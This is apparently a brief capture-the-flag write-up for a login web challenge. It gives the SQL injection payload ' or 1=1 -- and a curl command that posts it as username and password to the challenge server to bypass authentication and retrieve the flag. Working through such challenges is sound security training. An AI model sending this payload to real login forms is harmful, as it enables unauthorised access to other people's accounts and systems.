# SQL Injection

It is a simple sql injection, in which login can be bypassed by simply writing `' or 1=1 --` as username and password both.

when opening link, we found error file not found, but wait, that means server is running, 

Since it is an login web challenge, and title is magic keys, pointing towards sql injection magic code,

So trying this command,
```
curl  http://webchallenge.cybsec.in:9090/login -d "username=' or 1=1 -- -&password=' or 1=1 -- -"
```
will give flag